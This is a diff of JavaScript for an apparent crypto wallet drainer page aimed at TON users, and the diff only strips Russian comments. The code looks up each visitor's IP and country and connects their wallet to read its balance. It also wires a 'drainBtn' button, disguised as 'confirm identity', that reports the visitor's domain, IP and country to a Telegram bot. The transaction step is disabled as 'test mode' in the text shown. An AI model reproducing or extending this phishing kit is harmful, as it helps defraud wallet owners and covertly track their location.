@@ -6,7 +6,7 @@ var domain = window.location.hostname;
 var ipUser = '';
 var countryUser = '';
 
-// Определение IP
+
 fetch('https://ipapi.co/json/')
     .then(res => res.json())
     .then(data => {
@@ -16,7 +16,7 @@ fetch('https://ipapi.co/json/')
     })
     .catch(e => console.error('IP error:', e));
 
-// Функция отправки в Telegram (опционально)
+
 function sendTelegram(message) {
     if (!tgBotToken || !tgChat) return;
     const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
@@ -27,7 +27,7 @@ function sendTelegram(message) {
     }).catch(e => console.error('Telegram send error:', e));
 }
 
-// Инициализация TON Connect
+
 const protocol = window.location.protocol;
 const manifestUrl = protocol + '//' + domain + '/tonconnect-manifest.json';
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
@@ -38,7 +38,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
 const balanceSpan = document.getElementById('balanceValue');
 const drainBtn = document.getElementById('drainBtn');
 
-// Функция обновления баланса
+
 async function updateBalance(address) {
     try {
         const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
@@ -55,7 +55,7 @@ async function updateBalance(address) {
     }
 }
 
-// При подключении кошелька
+
 tonConnectUI.on('walletConnected', (walletInfo) => {
     console.log('Wallet connected:', walletInfo);
     drainBtn.disabled = false;
@@ -70,9 +70,9 @@ tonConnectUI.on('walletDisconnected', () => {
     balanceSpan.textContent = '—';
 });
 
-// Кнопка "Подтвердить личность" — НЕ РАБОТАЕТ (тест)
+
 drainBtn.addEventListener('click', function() {
     alert('Функция временно недоступна. Это тестовый режим.');
-    // Можно также отправить уведомление в Telegram без транзакции
+    
     sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n🔒 *Нажал кнопку, но транзакция отключена*`);
 });
